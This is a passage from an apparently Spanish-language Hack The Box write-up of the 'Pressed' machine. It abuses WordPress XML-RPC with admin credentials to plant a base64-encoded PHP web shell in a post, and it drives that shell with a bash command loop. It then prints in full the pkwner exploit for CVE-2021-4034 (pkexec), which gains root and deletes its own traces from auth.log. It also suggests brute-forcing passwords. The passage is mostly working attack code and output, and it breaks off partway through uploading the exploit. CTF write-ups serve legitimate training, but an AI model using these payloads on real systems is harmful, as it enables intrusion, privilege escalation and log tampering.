+  &lt;value&gt;&lt;string&gt;wp.getProfile&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getUsers&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getUser&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getTaxonomies&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getTaxonomy&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getTerms&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getTerm&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.deleteTerm&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.editTerm&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.newTerm&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPosts&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.deletePost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.editPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.newPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
+&lt;/data&gt;&lt;/array&gt;
+      &lt;/value&gt;
+    &lt;/param&gt;
+  &lt;/params&gt;
+&lt;/methodResponse&gt;
+</code></pre></div></div>
+<h2 id="user-flag">User flag</h2>
+<ul>
+<li><p>Bueno vemos todos los métodos este es interesante <code>&lt;value&gt;&lt;string&gt;htb.get_flag&lt;/string&gt;&lt;/value&gt;</code>.</p>
+</li>
+<li><p>Podemos ver la <code>user flag</code>.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap curl -X POST --data &quot;&lt;methodCall&gt;&lt;methodName&gt;htb.get_flag&lt;/methodName&gt;&lt;params&gt;&lt;/params&gt;&lt;/methodCall&gt;&quot; http://10.10.11.142/xmlrpc.php
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;methodResponse&gt;
+  &lt;params&gt;
+    &lt;param&gt;
+      &lt;value&gt;
+      &lt;string&gt;14a81d1565421c5c1461e1ad9b182b5b
+&lt;/string&gt;
+      &lt;/value&gt;
+    &lt;/param&gt;
+  &lt;/params&gt;
+&lt;/methodResponse&gt;
+</code></pre></div></div>
+<ul>
+<li>También podemos enumerar usuarios en otras máquinas donde esto esta activado te puedes hacer un script en <code>bash</code> que haga fuerza bruta en caso de que conozcas el nombre de un usuario para saber la contraseña.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap curl -X POST --data &quot;&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;administrator&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;pass&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;&quot; http://10.10.11.142/xmlrpc.php
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;methodResponse&gt;
+  &lt;fault&gt;
+    &lt;value&gt;
+      &lt;struct&gt;
+        &lt;member&gt;
+          &lt;name&gt;faultCode&lt;/name&gt;
+          &lt;value&gt;&lt;int&gt;403&lt;/int&gt;&lt;/value&gt;
+        &lt;/member&gt;
+        &lt;member&gt;
+          &lt;name&gt;faultString&lt;/name&gt;
+          &lt;value&gt;&lt;string&gt;Incorrect username or password.&lt;/string&gt;&lt;/value&gt;
+        &lt;/member&gt;
+      &lt;/struct&gt;
+    &lt;/value&gt;
+  &lt;/fault&gt;
+&lt;/methodResponse&gt;
+</code></pre></div></div>
+<h2 id="shell-as-www-data">Shell as www-data</h2>
+<ul>
+<li><p>Desde Python también se puede trabajar con esto.</p>
+</li>
+<li><p>En caso de tener errores tu script debe verse así.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Python"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Python</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-python">/.local/lib/python3.11/site-packages/wordpress_xmlrpc/base.py
+import collections.abc
+import sys
+
+from wordpress_xmlrpc.compat import xmlrpc_client, dict_type
+from wordpress_xmlrpc.exceptions import ServerConnectionError, UnsupportedXmlrpcMethodError, InvalidCredentialsError, XmlrpcDisabledError
+
+
+class Client(object):
+    &quot;&quot;&quot;
+    Connection to a WordPress XML-RPC API endpoint.
+
+    To execute XML-RPC methods, pass an instance of an
+    `XmlrpcMethod`-derived class to `Client`'s `call` method.
+    &quot;&quot;&quot;
+
+    def __init__(self, url, username, password, blog_id=0, transport=None):
+        self.url = url
+        self.username = username
+        self.password = password
+        self.blog_id = blog_id
+
+        try:
+            self.server = xmlrpc_client.ServerProxy(url, allow_none=True, transport=transport)
+            self.supported_methods = self.server.mt.supportedMethods()
+        except xmlrpc_client.ProtocolError:
+            e = sys.exc_info()[1]
+            raise ServerConnectionError(repr(e))
+
+    def call(self, method):
+        if method.method_name not in self.supported_methods:
+            raise UnsupportedXmlrpcMethodError(method.method_name)
+
+        server_method = getattr(self.server, method.method_name)
+        args = method.get_args(self)
+
+        try:
+            raw_result = server_method(*args)
+        except xmlrpc_client.Fault:
+            e = sys.exc_info()[1]
+            if e.faultCode == 403:
+                raise InvalidCredentialsError(e.faultString)
+            elif e.faultCode == 405:
+                raise XmlrpcDisabledError(e.faultString)
+            else:
+                raise
+        return method.process_result(raw_result)
+
+
+class XmlrpcMethod(object):
+    &quot;&quot;&quot;
+    Base class for XML-RPC methods.
+
+    Child classes can override methods and properties to customize behavior:
+
+    Properties:
+        * `method_name`: XML-RPC method name (e.g., 'wp.getUserInfo')
+        * `method_args`: Tuple of method-specific required parameters
+        * `optional_args`: Tuple of method-specific optional parameters
+        * `results_class`: Python class which will convert an XML-RPC response dict into an object
+    &quot;&quot;&quot;
+    method_name = None
+    method_args = tuple()
+    optional_args = tuple()
+    results_class = None
+
+    def __init__(self, *args, **kwargs):
+        if self.method_args or self.optional_args:
+            if self.optional_args:
+                max_num_args = len(self.method_args) + len(self.optional_args)
+                if not (len(self.method_args) &lt;= len(args) &lt;= max_num_args):
+                    raise ValueError(&quot;Invalid number of parameters to %s&quot; % self.method_name)
+            else:
+                if len(args) != len(self.method_args):
+                    raise ValueError(&quot;Invalid number of parameters to %s&quot; % self.method_name)
+
+            for i, arg_name in enumerate(self.method_args):
+                setattr(self, arg_name, args[i])
+
+            if self.optional_args:
+                for i, arg_name in enumerate(self.optional_args, start=len(self.method_args)):
+                    if i &gt;= len(args):
+                        break
+                    setattr(self, arg_name, args[i])
+
+        if 'results_class' in kwargs:
+            self.results_class = kwargs['results_class']
+
+    def default_args(self, client):
+        &quot;&quot;&quot;
+        Builds set of method-non-specific arguments.
+        &quot;&quot;&quot;
+        return tuple()
+
+    def get_args(self, client):
+        &quot;&quot;&quot;
+        Builds final set of XML-RPC method arguments based on
+        the method's arguments, any default arguments, and their
+        defined respective ordering.
+        &quot;&quot;&quot;
+        default_args = self.default_args(client)
+
+        if self.method_args or self.optional_args:
+            optional_args = getattr(self, 'optional_args', tuple())
+            args = []
+            for arg in (self.method_args + optional_args):
+                if hasattr(self, arg):
+                    obj = getattr(self, arg)
+                    if hasattr(obj, 'struct'):
+                        args.append(obj.struct)
+                    else:
+                        args.append(obj)
+            args = list(default_args) + args
+        else:
+            args = default_args
+
+        return args
+
+    def process_result(self, raw_result):
+        &quot;&quot;&quot;
+        Performs actions on the raw result from the XML-RPC response.
+
+        If a `results_class` is defined, the response will be converted
+        into one or more object instances of that class.
+        &quot;&quot;&quot;
+        if self.results_class and raw_result:
+            if isinstance(raw_result, dict_type):
+                return self.results_class(raw_result)
+            elif isinstance(raw_result, collections.abc.Iterable):
+                return [self.results_class(result) for result in raw_result]
+
+        return raw_result
+
+
+class AnonymousMethod(XmlrpcMethod):
+    &quot;&quot;&quot;
+    An XML-RPC method for which no authentication is required.
+    &quot;&quot;&quot;
+    pass
+
+
+class AuthenticatedMethod(XmlrpcMethod):
+    &quot;&quot;&quot;
+    An XML-RPC method for which user authentication is required.
+
+    Blog ID, username and password details will be passed from
+    the `Client` instance to the method call.
+    &quot;&quot;&quot;
+
+    def default_args(self, client):
+        return (client.blog_id, client.username, client.password)
+
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap pip3 install python-wordpress-xmlrpc
+</code></pre></div></div>
+<ul>
+<li>Vamos a importar Client para poder conectarnos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap python3
+Python 3.11.9 (main, Apr 10 2024, 13:16:36) [GCC 13.2.0] on linux
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+&gt;&gt;&gt; from wordpress_xmlrpc import Client
+</code></pre></div></div>
+<ul>
+<li>Si queremos usar un método como el posts para los posts del <code>wordpress</code> lo hacemos de la siguiente forma.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">&gt;&gt;&gt; from wordpress_xmlrpc.methods import posts
+</code></pre></div></div>
+<ul>
+<li>Ahora nos autenticamos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">&gt;&gt;&gt; client = Client(&quot;http://10.10.11.142/xmlrpc.php&quot;, &quot;admin&quot;, &quot;uhc-jan-finals-2022&quot;)
+</code></pre></div></div>
+<ul>
+<li>Ahora podemos ver los posts.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">&gt;&gt;&gt; post = client.call(posts.GetPosts())
+&gt;&gt;&gt; post
+[&lt;WordPressPost: b'UHC January Finals Under Way'&gt;]
+</code></pre></div></div>
+<ul>
+<li>Podemos analizar el contenido.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">&gt;&gt;&gt; post[0].content
+'&lt;!-- wp:paragraph --&gt;\n&lt;p&gt;The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.&lt;/p&gt;\n&lt;!-- /wp:paragraph --&gt;\n\n&lt;!-- wp:php-everywhere-block/php {&quot;code&quot;:&quot;JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U=&quot;,&quot;version&quot;:&quot;3.0.0&quot;} /--&gt;\n\n&lt;!-- wp:paragraph --&gt;\n&lt;p&gt;&lt;/p&gt;\n&lt;!-- /wp:paragraph --&gt;\n\n&lt;!-- wp:paragraph --&gt;\n&lt;p&gt;&lt;/p&gt;\n&lt;!-- /wp:paragraph --&gt;'
+</code></pre></div></div>
+<ul>
+<li>Vemos una cadena en base64 vamos a hacer un <code>decode</code> para ver que es.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  ~ echo &quot;JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U=&quot; | base64 -d; echo
+%3C%3Fphp%20%20echo(file_get_contents('%2Fvar%2Fwww%2Fhtml%2Foutput.log'))%3B%20%3F%3E
+</code></pre></div></div>
+<ul>
+<li>Nos da data en <code>url-encode</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  ~ php --interactive
+Interactive shell
+
+php &gt; echo urldecode(&quot;%3C%3Fphp%20%20echo(file_get_contents('%2Fvar%2Fwww%2Fhtml%2Foutput.log'))%3B%20%3F%3E&quot;);
+&lt;?php  echo(file_get_contents('/var/www/html/output.log')); ?&gt;
+</code></pre></div></div>
+<ul>
+<li><p>Al parecer la parte que vimos del <code>User Agent</code> viene del script <code>output.log</code>.</p>
+</li>
+<li><p>Estamos como el administrador así que podemos cambiar el contenido del archivo.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  ~ cat data
+&lt;?php
+	echo &quot;&lt;pre&gt;&quot; . shell_exec($_REQUEST['cmd']) . &quot;&lt;/pre&gt;&quot;;
+?&gt;
+</code></pre></div></div>
+<ul>
+<li>Pero tenemos que representarla en <code>base64</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  ~ base64 -w 0 data; echo
+PD9waHAKCWVjaG8gIjxwcmU+IiAuIHNoZWxsX2V4ZWMoJF9SRVFVRVNUWydjbWQnXSkgLiAiPC9wcmU+IjsKPz4K
+</code></pre></div></div>
+<ul>
+<li><p>Tendríamos que cambiar el contenido para meter ese allí.</p>
+</li>
+<li><p>Algo que podemos hacer es crearnos una variable que se iguale a todo los atributos del post existente.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">&gt;&gt;&gt; new_post = post[0]
+&gt;&gt;&gt; new_post
+&lt;WordPressPost: b'UHC January Finals Under Way'&gt;
+</code></pre></div></div>
+<ul>
+<li>Tiene lo mismo.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">&gt;&gt;&gt; new_post.content
+'&lt;!-- wp:paragraph --&gt;\n&lt;p&gt;The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.&lt;/p&gt;\n&lt;!-- /wp:paragraph --&gt;\n\n&lt;!-- wp:php-everywhere-block/php {&quot;code&quot;:&quot;JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U=&quot;,&quot;version&quot;:&quot;3.0.0&quot;} /--&gt;\n\n&lt;!-- wp:paragraph --&gt;\n&lt;p&gt;&lt;/p&gt;\n&lt;!-- /wp:paragraph --&gt;\n\n&lt;!-- wp:paragraph --&gt;\n&lt;p&gt;&lt;/p&gt;\n&lt;!-- /wp:paragraph --&gt;'
+</code></pre></div></div>
+<ul>
+<li>Vamos a cambiar el contenido solo la parte de base64.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">&gt;&gt;&gt; new_post.content = '&lt;!-- wp:paragraph --&gt;\n&lt;p&gt;The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.&lt;/p&gt;\n&lt;!-- /wp:paragraph --&gt;\n\n&lt;!-- wp:php-everywhere-block/php {&quot;code&quot;:&quot;PD9waHAKCWVjaG8gIjxwcmU+IiAuIHNoZWxsX2V4ZWMoJF9SRVFVRVNUWydjbWQnXSkgLiAiPC9wcmU+IjsKPz4K&quot;,&quot;version&quot;:&quot;3.0.0&quot;} /--&gt;\n\n&lt;!-- wp:paragraph --&gt;\n&lt;p&gt;&lt;/p&gt;\n&lt;!-- /wp:paragraph --&gt;\n\n&lt;!-- wp:paragraph --&gt;\n&lt;p&gt;&lt;/p&gt;\n&lt;!-- /wp:paragraph --&gt;'
+</code></pre></div></div>
+<ul>
+<li>Ahora para editar el post real vamos a hacer lo siguiente.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">&gt;&gt;&gt; client.call(posts.EditPost(new_post.id, new_post))
+True
+</code></pre></div></div>
+<ul>
+<li>Si recargamos la web desapareció la parte del <code>user agent</code>.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/pressed/7.png">
+</p>
+
+<ul>
+<li>Podemos ejecutar comandos.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/pressed/8.png">
+</p>
+
+<ul>
+<li><p>Bueno esta máquina tiene <code>IPtables</code> por detrás y no podemos enviarnos una reverse <code>shell</code> por ningún protocolo.</p>
+</li>
+<li><p>Tenemos que crear una <code>webshell</code>.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  wordpress_xmlrpc cat script.sh
+#!/bin/bash
+
+function ctrl_c(){
+    echo -e &quot;\n\n [+]Saliendo .... \n&quot;
+    exit 1
+}
+
+#Ctrl + c
+trap ctrl_c INT
+
+main_url=&quot;http://pressed.htb/index.php/2022/01/28/hello-world/?cmd=&quot;
+
+while [ &quot;$command&quot; != &quot;exit&quot; ]; do
+	echo -n &quot;$~ &quot; &amp;&amp; read -r command
+	command=&quot;$(echo $command | tr ' ' '+')&quot;
+
+	curl -s -X GET &quot;$main_url$command&quot; | grep &quot;&lt;pre&gt;&quot; -A 100 | grep &quot;&lt;/pre&gt;&quot; -B 100 | sed 's/&lt;pre&gt;//' | sed 's/&lt;\/pre&gt;//' | sed 's/shell//'
+done
+</code></pre></div></div>
+<ul>
+<li>Podemos ejecutar comandos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  wordpress_xmlrpc ./script.sh
+$~ whoami
+www-data
+
+$~ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+$~ hostname -I
+10.10.11.142
+</code></pre></div></div>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<ul>
+<li>Podemos ver la <code>flag</code> también desde aquí.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">$~ ls -l /home/htb/user.txt
+-rw-r--r-- 1 root root 33 Jun 24 21:36 /home/htb/user.txt
+
+$~ cat /home/htb/user.txt
+14a81d1565421c5c1461e1ad9b182b5b
+</code></pre></div></div>
+<ul>
+<li>No podemos cambiar de ruta por que no estamos dentro del sistema estamos desde fuera ejecutando comandos y como el script esta en la ruta <code>/var/www/html</code> por eso solo podemos quedarnos allí.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">$~ pwd
+cd/var/www/html
+
+$~ cd ..
+
+$~ pwd
+/var/www/html
+</code></pre></div></div>
+<ul>
+<li>Podemos ir hacia atrás con este comando.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">$~ cd ../ %26%26 pwd
+/var/www
+</code></pre></div></div>
+<ul>
+<li>El <code>pkexec</code> es <code>SUID</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">$~ ls -l /usr/bin/pkexec
+-rwsr-xr-x 1 root root 23440 Jul 14  2021 /usr/bin/pkexec
+</code></pre></div></div>
+<ul>
+<li>Para poder explotarlo desde fuera vamos a necesitar el siguiente script en <code>bash</code>.</li>
+<li><a href="https://raw.githubusercontent.com/kimusan/pkwner/main/pkwner.sh">https://raw.githubusercontent.com/kimusan/pkwner/main/pkwner.sh</a></li>
+<li>Podemos ejecutar un id para ver si estamos como root.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content cat pkwner.sh
+#!/bin/bash
+echo &quot;██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗ &quot;
+echo &quot;██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗&quot;
+echo &quot;██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝&quot;
+echo &quot;██╔═══╝ ██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗&quot;
+echo &quot;██║     ██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██║  ██║&quot;
+echo &quot;╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝&quot;
+echo &quot;CVE-2021-4034 PoC by Kim Schulz&quot;
+# shell poc by Kim Schulz
+echo &quot;[+] Setting up environment...&quot;
+mkdir -p 'GCONV_PATH=.'
+touch 'GCONV_PATH=./pkwner'
+chmod a+x 'GCONV_PATH=./pkwner'
+mkdir -p pkwner
+echo &quot;module UTF-8// PKWNER// pkwner 2&quot; &gt; pkwner/gconv-modules
+cat &gt; pkwner/pkwner.c &lt;&lt;- EOM
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+void gconv() {}
+void gconv_init() {
+  printf(&quot;hello&quot;);
+  setuid(0); setgid(0);
+	seteuid(0); setegid(0);
+  system(&quot;PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin/:/usr/local/sbin;&quot;
+         &quot;rm -rf 'GCONV_PATH=.' 'pkwner';&quot;
+         &quot;cat /var/log/auth.log|grep -v pkwner &gt;/tmp/al;cat /tmp/al &gt;/var/log/auth.log;&quot;
+         &quot;id&quot;);
+	exit(0);
+}
+EOM
+
+cat &gt; pkwner/exec.c &lt;&lt;- EOM
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+int main(){
+  char *env[] = {&quot;pkwner&quot;, &quot;PATH=GCONV_PATH=.&quot;, &quot;CHARSET=PKWNER&quot;,
+                 &quot;SHELL=pkwner&quot;, NULL};
+  execve(&quot;/usr/bin/pkexec&quot;, (char *[]){NULL}, env);
+}
+EOM
+echo &quot;[+] Build offensive gconv shared module...&quot;
+gcc -fPIC -shared -o pkwner/pkwner.so pkwner/pkwner.c
+echo &quot;[+] Build mini executor...&quot;
+gcc -o pkwner/executor pkwner/exec.c
+# export PATH=&quot;GCONV_PATH=.&quot;
+# export CHARSET=&quot;PKWNER&quot;
+#export SHELL=pkwner
+PATH='GCONV_PATH=.' ./pkwner/executor
+echo &quot;[+] Nice Job&quot;
+</code></pre></div></div>
+<ul>
+<li>Vamos a subirlo a la máquina desde el python3 interactivo.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">&gt;&gt;&gt; from wordpress_xmlrpc.methods import media
+&gt;&gt;&gt; with open(&quot;pkwner.sh&quot;, &quot;r&quot;) as f:
+...     filename = f.read()
+...
+&gt;&gt;&gt; filename
